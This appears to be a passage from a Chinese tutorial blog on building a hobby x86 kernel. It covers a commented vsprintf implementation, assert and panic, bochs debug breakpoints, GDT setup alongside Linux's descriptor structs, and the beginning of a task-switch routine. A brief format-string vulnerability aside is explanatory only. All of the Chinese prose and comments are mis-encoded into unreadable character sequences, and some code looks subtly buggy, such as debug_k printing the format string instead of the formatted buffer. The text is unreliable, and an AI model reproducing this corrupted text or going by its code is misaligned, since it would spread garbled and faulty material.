æ˜¯ç‰¹æ®Šè½¬æ¢ case &#x27;#&#x27;: flags |= SPECIAL; goto repeat; // è¦å¡«é›¶(å³&#x27;0&#x27;)ï¼Œå¦åˆ™æ˜¯ç©ºæ ¼ case &#x27;0&#x27;: flags |= ZEROPAD; goto repeat; &#125; // å–å½“å‰å‚æ•°å­—æ®µå®½åº¦åŸŸå€¼ï¼Œæ”¾å…¥ field_width å˜é‡ä¸­ field_width = -1; // å¦‚æœå®½åº¦åŸŸä¸­æ˜¯æ•°å€¼åˆ™ç›´æ¥å–å…¶ä¸ºå®½åº¦å€¼ if (is_digit(*fmt)) field_width = skip_atoi(&amp;fmt); // å¦‚æœå®½åº¦åŸŸä¸­æ˜¯å­—ç¬¦ &#x27;*&#x27;ï¼Œè¡¨ç¤ºä¸‹ä¸€ä¸ªå‚æ•°æŒ‡å®šå®½åº¦ else if (*fmt == &#x27;*&#x27;) &#123; ++fmt; // å› æ­¤è°ƒç”¨ va_arg å–å®½åº¦å€¼ field_width = va_arg(args, int); // è‹¥æ­¤æ—¶å®½åº¦å€¼å°äº 0ï¼Œåˆ™è¯¥è´Ÿæ•°è¡¨ç¤ºå…¶å¸¦æœ‰æ ‡å¿—åŸŸ &#x27;-&#x27; æ ‡å¿—ï¼ˆå·¦å¯¹é½ï¼‰ if (field_width &lt; 0) &#123; // å› æ­¤è¿˜éœ€åœ¨æ ‡å¿—å˜é‡ä¸­æ·»å…¥è¯¥æ ‡å¿—ï¼Œå¹¶å°†å­—æ®µå®½åº¦å€¼å–ä¸ºå…¶ç»å¯¹å€¼ field_width = -field_width; flags |= LEFT; &#125; &#125; // å–æ ¼å¼è½¬æ¢ä¸²çš„ç²¾åº¦åŸŸï¼Œå¹¶æ”¾å…¥ precision å˜é‡ä¸­ precision = -1; // ç²¾åº¦åŸŸå¼€å§‹çš„æ ‡å¿—æ˜¯&#x27;.&#x27; å…¶å¤„ç†è¿‡ç¨‹ä¸ä¸Šé¢å®½åº¦åŸŸçš„ç±»ä¼¼ if (*fmt == &#x27;.&#x27;) &#123; ++fmt; // å¦‚æœç²¾åº¦åŸŸä¸­æ˜¯æ•°å€¼åˆ™ç›´æ¥å–å…¶ä¸ºç²¾åº¦å€¼ if (is_digit(*fmt)) precision = skip_atoi(&amp;fmt); // å¦‚æœç²¾åº¦åŸŸä¸­æ˜¯å­—ç¬¦&#x27;*&#x27;ï¼Œè¡¨ç¤ºä¸‹ä¸€ä¸ªå‚æ•°æŒ‡å®šç²¾åº¦ else if (*fmt == &#x27;*&#x27;) &#123; // å› æ­¤è°ƒç”¨ va_arg å–ç²¾åº¦å€¼ precision = va_arg(args, int); &#125; // è‹¥æ­¤æ—¶å®½åº¦å€¼å°äº 0ï¼Œåˆ™å°†å­—æ®µç²¾åº¦å€¼å–ä¸ºå…¶ç»å¯¹å€¼ if (precision &lt; 0) precision = 0; &#125; // ä¸‹é¢è¿™æ®µä»£ç åˆ†æé•¿åº¦ä¿®é¥°ç¬¦ï¼Œå¹¶å°†å…¶å­˜å…¥ qualifer å˜é‡ qualifier = -1; if (*fmt == &#x27;h&#x27; || *fmt == &#x27;l&#x27; || *fmt == &#x27;L&#x27;) &#123; qualifier = *fmt; ++fmt; &#125; // ä¸‹é¢åˆ†æè½¬æ¢æŒ‡ç¤ºç¬¦ switch (*fmt) &#123; // å¦‚æœè½¬æ¢æŒ‡ç¤ºç¬¦æ˜¯&#x27;c&#x27;ï¼Œåˆ™è¡¨ç¤ºå¯¹åº”å‚æ•°åº”æ˜¯å­—ç¬¦ case &#x27;c&#x27;: // æ­¤æ—¶å¦‚æœæ ‡å¿—åŸŸè¡¨æ˜ä¸æ˜¯å·¦å¯¹é½ï¼Œ if (!(flags &amp; LEFT)) // åˆ™è¯¥å­—æ®µå‰é¢æ”¾å…¥ (å®½åº¦åŸŸå€¼ - 1) ä¸ªç©ºæ ¼å­—ç¬¦ï¼Œç„¶åå†æ”¾å…¥å‚æ•°å­—ç¬¦ while (--field_width &gt; 0) *str++ = &#x27; &#x27;; *str++ = (unsigned char)va_arg(args, int); // å¦‚æœå®½åº¦åŸŸè¿˜å¤§äº 0ï¼Œåˆ™è¡¨ç¤ºä¸ºå·¦å¯¹é½ // åˆ™åœ¨å‚æ•°å­—ç¬¦åé¢æ·»åŠ  (å®½åº¦å€¼-1) ä¸ªç©ºæ ¼å­—ç¬¦ while (--field_width &gt; 0) *str++ = &#x27; &#x27;; break; // å¦‚æœè½¬æ¢æŒ‡ç¤ºç¬¦æ˜¯ &#x27;s&#x27;ï¼Œåˆ™è¡¨ç¤ºå¯¹åº”å‚æ•°æ˜¯å­—ç¬¦ä¸² case &#x27;s&#x27;: s = va_arg(args, char *); // é¦–å…ˆå–å‚æ•°å­—ç¬¦ä¸²çš„é•¿åº¦ len = strlen(s); // è‹¥å…¶è¶…è¿‡äº†ç²¾åº¦åŸŸå€¼, åˆ™æ‰©å±•ç²¾åº¦åŸŸ=å­—ç¬¦ä¸²é•¿åº¦ if (precision &lt; 0) precision = len; else if (len &gt; precision) len = precision; // æ­¤æ—¶å¦‚æœæ ‡å¿—åŸŸè¡¨æ˜ä¸æ˜¯å·¦å¯¹é½ if (!(flags &amp; LEFT)) // åˆ™è¯¥å­—æ®µå‰æ”¾å…¥ (å®½åº¦å€¼-å­—ç¬¦ä¸²é•¿åº¦) ä¸ªç©ºæ ¼å­—ç¬¦ while (len &lt; field_width--) *str++ = &#x27; &#x27;; // ç„¶åå†æ”¾å…¥å‚æ•°å­—ç¬¦ä¸² for (i = 0; i &lt; len; ++i) *str++ = *s++; // å¦‚æœå®½åº¦åŸŸè¿˜å¤§äº 0ï¼Œåˆ™è¡¨ç¤ºä¸ºå·¦å¯¹é½ // åˆ™åœ¨å‚æ•°å­—ç¬¦ä¸²åé¢ï¼Œæ·»åŠ (å®½åº¦å€¼-å­—ç¬¦ä¸²é•¿åº¦)ä¸ªç©ºæ ¼å­—ç¬¦ while (len &lt; field_width--) *str++ = &#x27; &#x27;; break; // å¦‚æœæ ¼å¼è½¬æ¢ç¬¦æ˜¯&#x27;o&#x27;ï¼Œè¡¨ç¤ºéœ€å°†å¯¹åº”çš„å‚æ•°è½¬æ¢æˆå…«è¿›åˆ¶æ•°çš„å­—ç¬¦ä¸² case &#x27;o&#x27;: str = number(str, va_arg(args, unsigned long), 8, field_width, precision, flags); break; // å¦‚æœæ ¼å¼è½¬æ¢ç¬¦æ˜¯&#x27;p&#x27;ï¼Œè¡¨ç¤ºå¯¹åº”å‚æ•°çš„ä¸€ä¸ªæŒ‡é’ˆç±»å‹ case &#x27;p&#x27;: // æ­¤æ—¶è‹¥è¯¥å‚æ•°æ²¡æœ‰è®¾ç½®å®½åº¦åŸŸï¼Œåˆ™é»˜è®¤å®½åº¦ä¸º 8ï¼Œå¹¶ä¸”éœ€è¦æ·»é›¶ if (field_width == -1) &#123; field_width = 8; flags |= ZEROPAD; &#125; str = number(str, (unsigned long)va_arg(args, void *), 16, field_width, precision, flags); break; // è‹¥æ ¼å¼è½¬æ¢æŒ‡ç¤ºæ˜¯ &#x27;x&#x27; æˆ– &#x27;X&#x27; // åˆ™è¡¨ç¤ºå¯¹åº”å‚æ•°éœ€è¦æ‰“å°æˆåå…­è¿›åˆ¶æ•°è¾“å‡º case &#x27;x&#x27;: // &#x27;x&#x27;è¡¨ç¤ºç”¨å°å†™å­—æ¯è¡¨ç¤º flags |= SMALL; case &#x27;X&#x27;: str = number(str, va_arg(args, unsigned long), 16, field_width, precision, flags); break; // å¦‚æœæ ¼å¼è½¬æ¢å­—ç¬¦æ˜¯&#x27;d&#x27;, &#x27;i&#x27; æˆ– &#x27;u&#x27;ï¼Œåˆ™è¡¨ç¤ºå¯¹åº”å‚æ•°æ˜¯æ•´æ•° case &#x27;d&#x27;: case &#x27;i&#x27;: // &#x27;d&#x27;, &#x27;i&#x27;ä»£è¡¨ç¬¦å·æ•´æ•°ï¼Œå› æ­¤éœ€è¦åŠ ä¸Šå¸¦ç¬¦å·æ ‡å¿— flags |= SIGN; // &#x27;u&#x27;ä»£è¡¨æ— ç¬¦å·æ•´æ•° case &#x27;u&#x27;: str = number(str, va_arg(args, unsigned long), 10, field_width, precision, flags); break; // è‹¥æ ¼å¼è½¬æ¢æŒ‡ç¤ºç¬¦æ˜¯ &#x27;n&#x27; // è¡¨ç¤ºè¦æŠŠåˆ°ç›®å‰ä¸ºæ­¢è½¬æ¢è¾“å‡ºçš„å­—ç¬¦æ•°ä¿å­˜åˆ°å¯¹åº”å‚æ•°æŒ‡é’ˆæŒ‡å®šçš„ä½ç½®ä¸­ case &#x27;n&#x27;: // é¦–å…ˆåˆ©ç”¨ va_arg() å–å¾—è¯¥å‚æ•°æŒ‡é’ˆ ip = va_arg(args, int *); // ç„¶åå°†å·²ç»è½¬æ¢å¥½çš„å­—ç¬¦æ•°å­˜å…¥è¯¥æŒ‡é’ˆæ‰€æŒ‡çš„ä½ç½® *ip = (str - buf); break; default: // è‹¥æ ¼å¼è½¬æ¢ç¬¦ä¸æ˜¯ &#x27;%&#x27;ï¼Œåˆ™è¡¨ç¤ºæ ¼å¼å­—ç¬¦ä¸²æœ‰é”™ if (*fmt != &#x27;%&#x27;) // ç›´æ¥å°†ä¸€ä¸ª &#x27;%&#x27; å†™å…¥è¾“å‡ºä¸²ä¸­ *str++ = &#x27;%&#x27;; // å¦‚æœæ ¼å¼è½¬æ¢ç¬¦çš„ä½ç½®å¤„è¿˜æœ‰å­—ç¬¦ï¼Œåˆ™ä¹Ÿç›´æ¥å°†è¯¥å­—ç¬¦å†™å…¥è¾“å‡ºä¸²ä¸­ // ç„¶åç»§ç»­å¾ªç¯å¤„ç†æ ¼å¼å­—ç¬¦ä¸² if (*fmt) *str++ = *fmt; else // å¦åˆ™è¡¨ç¤ºå·²ç»å¤„ç†åˆ°æ ¼å¼å­—ç¬¦ä¸²çš„ç»“å°¾å¤„ï¼Œåˆ™é€€å‡ºå¾ªç¯ --fmt; break; &#125; &#125; // æœ€ååœ¨è½¬æ¢å¥½çš„å­—ç¬¦ä¸²ç»“å°¾å¤„æ·»ä¸Šå­—ç¬¦ä¸²ç»“æŸæ ‡å¿— *str = &#x27;\\0&#x27;; // è¿”å›è½¬æ¢å¥½çš„å­—ç¬¦ä¸²é•¿åº¦å€¼ i = str - buf; return i;&#125;// ç»“æœæŒ‰æ ¼å¼è¾“å‡ºå­—ç¬¦ä¸²åˆ° bufint sprintf(char *buf, const char *fmt, ...)&#123; va_list args; va_start(args, fmt); int i = vsprintf(buf, fmt, args); va_end(args); return i;&#125; å¯ä»¥æ”¹å†™src/kernel/main.cäº† 123456789101112131415161718192021#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); int count=31; while(count--) &#123; // console_write(message, sizeof(message) - 1); printk(&quot;hello xsys %#010d\\n&quot;, count); &#125; return;&#125; å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´ã®ä¸€ç‚¹è¡¥å…… åœ¨ä¹‹å‰çš„æ–‡ç« é‡Œé¢è®²è¿‡äº†ï¼Œä½†æ˜¯è¿™æ¬¡å¯ä»¥ä»æ–°çš„è§†è§’å‡ºå‘ 123456789#include &lt;stdio.h&gt;int main()&#123; char msg[] = &quot;XSYS\\n&quot;; int a = 10; printf(&quot;hello %d %s %d %d\\n&quot;, a, msg, 0xaa, 0xff); return 0;&#125; 1gcc -m32 -g -o test test.c è¿™é‡Œä½¿ç”¨32ä½æ˜¯ä¸ºäº†ä¸è®©å‚æ•°ä¼ åˆ°å¯„å­˜å™¨ä¸­ï¼Œè¿™æ ·å‚æ•°åœ¨æ ˆä¸Šé¢æ–¹ä¾¿è°ƒè¯• gccè¿™é‡Œä½¿ç”¨çš„æ—¶æ ‡å‡†çš„cdecl(c declearation)ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å‚æ•°æ˜¯ä»å³å¾€å·¦å…¥æ ˆï¼ŒåŠå›¾ä¸­çš„4ä¸ªpush åœ¨callä¹‹å‰çš„æ ˆå¦‚ä¸‹ æ‰€ä»¥å½“vsprintfæ£€æµ‹åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶ï¼Œä»–å°±ä¼šå°†æ ˆé¡¶çš„å€¼æŒ‰ç…§æå‰é¢„å®šçš„æ ¼å¼è¾“å‡ºå‡ºæ¥ã€‚ æ‰€ä»¥å¯¹å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´åˆ©ç”¨æ¥è¯´ï¼Œé‡è¦çš„æ˜¯call vsprintfæ—¶ï¼Œæ ˆçš„æƒ…å†µ æ“ä½œç³»ç»Ÿå®ç°-æ–­è¨€ä¸è°ƒè¯• ä»£ç æ¥æºï¼šhttps://github.com/StevenBaby/onix ç›¸å…³è¯¾ç¨‹ï¼šhttps://www.bilibili.com/video/BV1gR4y1u7or æ„Ÿè°¢Bç«™UPï¼šè¸Œèº‡æœˆå…‰ å¸¦æ¥çš„ç›¸å…³ä»£ç å’Œæ•™ç¨‹ æ–­è¨€ å¦‚æœè¦åˆ¤æ–­ä¸€ä¸ªæ¡ä»¶æ˜¯å¦æˆç«‹ï¼Œå¯ä»¥æœ‰ 1234if (exp) ....;else ERROR; æ¯ä¸ªåˆ¤æ–­éƒ½è¿™æ ·å†™çš„è¯ä¼šå¯¼è‡´ä»£ç å¼‚å¸¸éš¾è¯»ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå‡½æ•°assert()æ¥å®ç° è€Œæˆ‘ä»¬çš„assert()è‚¯å®šè¦æ‰“å°å‡ºé”™çš„ä»£ç æ–‡ä»¶ã€å“ªä¸€è¡Œã€æŠ¥é”™æç¤ºä¿¡æ¯ ä¸è¿‡è¿˜å¥½ä¹‹å‰æˆ‘ä»¬åœ¨printkä¸­å®ç°äº†è¿™ä¸€ç‚¹ src/include/xsys/assert.h 1234567891011121314#ifndef XSYS_ASSERT_H#define XSYS_ASSERT_Hvoid assertion_failure(char *exp, char *file, char *base, int line);#define assert(exp) \\ if (exp) \\ ; \\ else \\ assertion_failure(#exp, __FILE__, __BASE_FILE__, __LINE__)void panic(const char *fmt, ...);#endif src/kernel/assert.c 12345678910111213141516171819202122#include &lt;xsys/assert.h&gt;#include &lt;xsys/stdarg.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/printk.h&gt;static u8 buf[1024];void assertion_failure(char *exp, char *file, char *base, int line)&#123; printk( &quot;\\n--&gt; assert(%s) failed!!!\\n&quot; &quot;--&gt; file: %s \\n&quot; &quot;--&gt; base: %s \\n&quot; &quot;--&gt; line: %d \\n&quot;, exp, file, base, line); spin(&quot;assertion_failure()&quot;); // ä¸å¯èƒ½èµ°åˆ°è¿™é‡Œï¼Œå¦åˆ™å‡ºé”™ï¼› asm volatile(&quot;ud2&quot;);&#125; src/kernel/main.c 12345678910111213141516171819#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;// #include &lt;xsys/global.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); assert(3&lt;5); assert(3&gt;5); return;&#125; PANIC æ…Œä¹± å½“æˆ‘ä»¬ä»£ç è¿‡å¤šï¼Œæµ‹è¯•é˜¶æ®µä¸å¯é¿å…åœ°ä¼šå†™ä¸€äº›bugï¼Œå¯èƒ½å¯¼è‡´ä¾‹å¦‚ï¼šx/0è¿™ç§ï¼Œä¼šè§¦å‘ç³»ç»Ÿçš„å´©æºƒï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å¯¹è¿™ç§è‡´å‘½é”™è¯¯(Fatal Error)è¦æœ‰å¤„ç† src/kernel/assert.c 12345678910111213void panic(const char *fmt, ...)&#123; va_list args; va_start(args, fmt); int i = vsprintf(buf, fmt, args); va_end(args); printk(&quot;!!! panic !!!\\n--&gt; %s \\n&quot;, buf); spin(&quot;panic()&quot;); // ä¸å¯èƒ½èµ°åˆ°è¿™é‡Œï¼Œå¦åˆ™å‡ºé”™ï¼› asm volatile(&quot;ud2&quot;);&#125; src/kernel/main.c 123456789101112131415161718#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;// #include &lt;xsys/global.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); panic(&quot;test!!!\\n&quot;); return;&#125; è°ƒè¯• bochsä¸­çš„æ–­ç‚¹æ˜¯ï¼šxchg bx,bx æ‰€ä»¥æˆ‘ä»¬é€šè¿‡è£¸æ±‡ç¼–æ¥å®ç°æ–­ç‚¹ï¼ŒåŒæ—¶æ˜¾ç¤ºåœæ­¢åœ¨äº†é‚£ä¸ªæ–‡ä»¶çš„å“ªä¸€è¡Œ src/include/xsys/debug.h 123456789#ifndef XSYS_DEBUG_H#define XSYS_DEBUG_Hvoid debug_k(char* file, int line, const char* fmt, ...);#define BMB asm volatile (&quot;xchgw %bx, %bx&quot;)#define DEBUGK(fmt, args...) debug_k(__BASE_FILE__, __LINE__, fmt, ##args)#endif src/kernel/debug.c 1234567891011121314#include &lt;xsys/debug.h&gt;#include &lt;xsys/stdarg.h&gt;#include &lt;xsys/printk.h&gt;#include &lt;xsys/stdio.h&gt;static char buf[1024];void debug_k(char* file, int line, const char* fmt, ...)&#123; va_list args; va_start(args, fmt); vsprintf(buf, fmt, args); printk(&quot;[%s] [%d] %s&quot;, file, line, fmt);&#125; src/kernel/main.c 1234567891011121314151617181920#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/global.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); BMB; assert(3&lt;5); DEBUGK(&quot;debug test&quot;); return;&#125; æ“ä½œç³»ç»Ÿå®ç°-å†…æ ¸å…¨å±€æè¿°ç¬¦|è¿›ç¨‹è°ƒåº¦åŠä¸Šä¸‹æ–‡åˆ‡æ¢ å†…æ ¸å…¨å±€æè¿°ç¬¦ å°†loader.asmé‡Œé¢å…¨å±€æè¿°åŠŸèƒ½æ”¾åˆ°å†…æ ¸é‡Œé¢ï¼ˆç¡®å®ï¼Œä½ ä¸è§‰å¾—è¿™æ ·æ±‡ç¼–ä¸€ä½ä¸€ä½çš„è®¾ç½®å¾ˆéº»çƒ¦å—ï¼Ÿï¼‰ 12descriptor_t gdt[GDT_SIZE]; // å†…æ ¸å…¨å±€æè¿°ç¬¦è¡¨pointer_t gdt_ptr; // å†…æ ¸å…¨å±€æè¿°ç¬¦è¡¨æŒ‡é’ˆ ä¹‹å‰çš„æ±‡ç¼– 12lgdt [gdt_ptr]; åŠ è½½ gdtsgdt [gdt_ptr]; ä¿å­˜ gdt src/include/xsys/global.h 123456789101112131415161718192021222324252627282930313233343536373839404142#ifndef ONIX_GLOBAL_H#define ONIX_GLOBAL_H#include &lt;xsys/types.h&gt;#define GDT_SIZE 128// å…¨å±€æè¿°ç¬¦typedef struct descriptor_t /* å…± 8 ä¸ªå­—èŠ‚ */&#123; unsigned short limit_low; // æ®µç•Œé™ 0 ~ 15 ä½ unsigned int base_low : 24; // åŸºåœ°å€ 0 ~ 23 ä½ 16M unsigned char type : 4; // æ®µç±»å‹ unsigned char segment : 1; // 1 è¡¨ç¤ºä»£ç æ®µæˆ–æ•°æ®æ®µï¼Œ0 è¡¨ç¤ºç³»ç»Ÿæ®µ unsigned char DPL : 2; // Descriptor Privilege Level æè¿°ç¬¦ç‰¹æƒç­‰çº§ 0 ~ 3 unsigned char present : 1; // å­˜åœ¨ä½ï¼Œ1 åœ¨å†…å­˜ä¸­ï¼Œ0 åœ¨ç£ç›˜ä¸Š unsigned char limit_high : 4; // æ®µç•Œé™ 16 ~ 19; unsigned char available : 1; // è¯¥å®‰æ’çš„éƒ½å®‰æ’äº†ï¼Œé€ç»™æ“ä½œç³»ç»Ÿå§ unsigned char long_mode : 1; // 64 ä½æ‰©å±•æ ‡å¿— unsigned char big : 1; // 32 ä½ è¿˜æ˜¯ 16 ä½; unsigned char granularity : 1; // ç²’åº¦ 4KB æˆ– 1B unsigned char base_high; // åŸºåœ°å€ 24 ~ 31 ä½&#125; _packed descriptor_t;// æ®µé€‰æ‹©å­typedef struct selector_t&#123; u8 RPL : 2; u8 TI : 1; u16 index : 13;&#125; selector_t;// å…¨å±€æè¿°ç¬¦è¡¨æŒ‡é’ˆtypedef struct pointer_t&#123; u16 limit; u32 base;&#125; _packed pointer_t;void gdt_init();#endif src/kernel/global.c 1234567891011121314151617181920212223#include &lt;xsys/global.h&gt;#include &lt;xsys/string.h&gt;#include &lt;xsys/debug.h&gt;descriptor_t gdt[GDT_SIZE]; // å†…æ ¸å…¨å±€æè¿°ç¬¦è¡¨pointer_t gdt_ptr; // å†…æ ¸å…¨å±€æè¿°ç¬¦è¡¨æŒ‡é’ˆ// åˆå§‹åŒ–å†…æ ¸å…¨å±€æè¿°ç¬¦è¡¨void gdt_init()&#123; BMB; DEBUGK(&quot;init gdt!!!\\n&quot;); asm volatile(&quot;sgdt gdt_ptr&quot;); memcpy(&amp;gdt, (void *)gdt_ptr.base, gdt_ptr.limit + 1); gdt_ptr.base = (u32)&amp;gdt; gdt_ptr.limit = sizeof(gdt) - 1; BMB; asm volatile(&quot;lgdt gdt_ptr\\n&quot;); BMB;&#125; src/kernel/main.c 123456789101112131415161718#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/global.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); gdt_init(); return;&#125; è¿™é‡Œæ˜¯MBRæœ€å¼€å§‹çš„GDTï¼Œä¹Ÿæ˜¯ç¬¬ä¸€ä¸ªæ–­ç‚¹ åœ¨æ‰§è¡Œlgdt ds:addrå è¿™æ ·å°±æ‰©å……åˆ°äº†127ä¸ªGDT æ‹“å±• åœ¨linuxå†…æ ¸ä¸­æ˜¯å¦‚ä½•å®ç°çš„ åˆ°äº†ä¿æŠ¤æ¨¡å¼ï¼Œå†…å­˜ç®¡ç†åˆ†ä¸ºæ®µå¼ï¼Œå’Œæ®µé¡µå¼ï¼Œä¹Ÿå°±æ˜¯æ®µæ¨¡å¼å¿…ä¸å¯å°‘ å¯¹æ®µæ¨¡å¼æ¥è¯´ï¼Œè®¿é—®ä¸€ä¸ªå†…å­˜ä»ç„¶ç”¨çš„ã€æ®µåŸºåœ°å€ï¼šåç§»åœ°å€ã€‘ GDTï¼šæŠŠè¿™äº›é•¿åº¦ä¸º64bitçš„æ®µæè¿°ç¬¦æ”¾å…¥ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œè€Œå°†æ®µå¯„å­˜å™¨ä¸­çš„å€¼ä½œä¸ºä¸‹æ ‡ç´¢å¼•æ¥é—´æ¥å¼•ç”¨ æ®µæè¿°ç¬¦ â€‹ åŒæ ·çš„åœ¨æºç ä¸­æœ‰ â€‹ /arch/x86/include/asm/desc_defs.h 12345678910111213141516171819202122232425262728293031323334353637#ifndef __ASSEMBLY__#include &lt;linux/types.h&gt;/* 8 byte segment descriptor */struct desc_struct &#123; u16 limit0; u16 base0; u16 base1: 8, type: 4, s: 1, dpl: 2, p: 1; u16 limit1: 4, avl: 1, l: 1, d: 1, g: 1, base2: 8;&#125; __attribute__((packed));#define GDT_ENTRY_INIT(flags, base, limit) \\ &#123; \\ .limit0 = (u16) (limit), \\ .limit1 = ((limit) &gt;&gt; 16) &amp; 0x0F, \\ .base0 = (u16) (base), \\ .base1 = ((base) &gt;&gt; 16) &amp; 0xFF, \\ .base2 = ((base) &gt;&gt; 24) &amp; 0xFF, \\ .type = (flags &amp; 0x0f), \\ .s = (flags &gt;&gt; 4) &amp; 0x01, \\ .dpl = (flags &gt;&gt; 5) &amp; 0x03, \\ .p = (flags &gt;&gt; 7) &amp; 0x01, \\ .avl = (flags &gt;&gt; 12) &amp; 0x01, \\ .l = (flags &gt;&gt; 13) &amp; 0x01, \\ .d = (flags &gt;&gt; 14) &amp; 0x01, \\ .g = (flags &gt;&gt; 15) &amp; 0x01, \\ &#125;.../* LDT or TSS descriptor in the GDT. */...struct desc_ptr &#123; unsigned short size; unsigned long address;&#125; __attribute__((packed)) ; åœ¨/arch/x86/include/asm/desc.hå®šä¹‰äº†ä¸€ä¸ªæè¿°ç¬¦æ•°ç»„ï¼Œåˆ™ä¸ºgdt 123struct gdt_page &#123; struct desc_struct gdt[GDT_ENTRIES];&#125; __attribute__((aligned(PAGE_SIZE))); æœ€åæ›´å…·è¿™ä¸ªæ‰¾åˆ°gdtçš„ç›¸å…³åº”ç”¨å°±è¡Œäº† è¿›ç¨‹è°ƒåº¦åŠä¸Šä¸‹æ–‡åˆ‡æ¢ åœ¨32ä½ä¸‹ï¼Œå‚æ•°ä¼ é€’æ˜¯é€šè¿‡æ ˆä¼ é€’çš„ï¼Œä½†æ˜¯å…·ä½“çš„ä¿¡æ¯ä¼šä¿å­˜åˆ°å¯„å­˜å™¨ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ºäº†ä¸ä¿®æ”¹å¯„å­˜å™¨çš„å€¼ï¼Œæœ‰ä¸€å¥—è°ƒç”¨è§„åˆ™ã€‚ä¸»è¦æœ‰SystemVè§„åˆ™å’ŒPosixè§„åˆ™ â€‹ System V The System V Interface Definition (SVID) is a standard that describes the AT&amp;T UNIX System V behavior, including that of system calls, C libraries, available programs and devices. â€‹ Posix Portable Operating System Interface standards specified by IEEE to define application programming interface (API). POSIX covers all the three forms of IPC cdecl å‡½æ•°å®å‚åœ¨çº¿ç¨‹æ ˆä¸ŠæŒ‰ç…§ä»å³è‡³å·¦çš„é¡ºåºä¾æ¬¡å‹æ ˆã€‚ å‡½æ•°ç»“æœä¿å­˜åœ¨å¯„å­˜å™¨EAX/AX/ALä¸­ è°ƒç”¨è€…è´Ÿè´£ä»çº¿ç¨‹æ ˆä¸­å¼¹å‡ºå®å‚ï¼ˆå³æ¸…æ ˆï¼‰ å—åˆ°å‡½æ•°è°ƒç”¨å½±å“çš„å¯„å­˜å™¨ï¼ˆvolatile registersï¼‰ï¼šEAX, ECX, EDX, ST0 - ST7, ES, GS ä¸å—å‡½æ•°è°ƒç”¨å½±å“çš„å¯„å­˜å™¨ï¼š EBX, EBP, ESP, EDI, ESI, CS, DS å› ä¸ºå‡½æ•°è°ƒç”¨çš„æ—¶å€™ä¸å—å‡½æ•°è°ƒç”¨å½±å“çš„å¯„å­˜å™¨ï¼š EBX, EBP, ESP, EDI, ESI, CS, DSï¼Œæˆ‘ä»¬ç®€åŒ–ä¸ºEBXã€ESIã€EDIï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿å­˜è¿™äº› src/kernel/schedule.asm 1234567891011121314151617181920212223global task_switchtask_switch: push ebp mov ebp, esp push ebx push esi push edi mov eax, esp; and eax, 0xfffff000; current mov [eax], esp mov eax, [ebp + 8]; next mov esp, [eax] pop edi pop esi pop ebx pop ebp ret ä¸ºäº†ç†è§£ä¸Šé¢çš„å…¶ä»–ç»†èŠ‚ï¼Œæˆ‘ä»¬å‡è®¾æœ‰è¿™ä¹ˆä¸€ç§æƒ…å†µï¼šæˆ‘ä»¬åŒæ—¶æœ‰ä¸¤ä¸ªå‡½æ•°ï¼ˆä»»åŠ¡|è¿›ç¨‹ï¼‰Aã€Bï¼Œä¸¤è€…éœ€è¦ç›¸äº’åˆ‡æ¢ï¼Œä¸”è¿ä¸¤ä¸ªç¨‹åºè·‘èµ·æ¥çš„æ—¶å€™éƒ½æ˜¯åœ¨æ ˆä¸Šé¢ï¼Œå…¶ä¸­çš„æ ˆå°±æ˜¯å†…æ ¸æ ˆ(kernel stack) 1234typedef struct task_t&#123; u32 *stack; // å†…æ ¸æ ˆ&#125; task_t; å› ä¸ºç³»ç»Ÿæ˜¯32ä½çš„ï¼Œæ‰€ä»¥æ ˆå¯ä»¥æš‚æ—¶è¡¨ç¤º32ä½æ•°ç»„ è¿›ç¨‹åˆ›å»ºçš„æ—¶å€™ï¼Œæˆ‘ä»¬è¦åˆå§‹åŒ–è¿›ç¨‹ç›¸å¯¹åº”çš„æ ˆ 1234567891011121314static void task_create(task_t *task, target_t target)&#123; u32 stack = (u32)task + PAGE_SIZE; stack -= sizeof(task_frame_t); task_frame_t *frame = (task_frame_t *)stack; frame-&gt;ebx = 0x11111111; frame-&gt;esi = 0x22222222; frame-&gt;edi = 0x33333333; frame-&gt;ebp = 0x44444444; frame-&gt;eip = (void *)target; task-&gt;stack = (u32 *)stack;&#125; å½“Aå‘Båˆ‡æ¢çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±éœ€è¦å¾—åˆ°å½“å‰è¿›ç¨‹çš„å†…å­˜åœ°å€ï¼Œä¿å­˜ç›¸å…³ä¿¡æ¯ï¼ˆEBX ESI 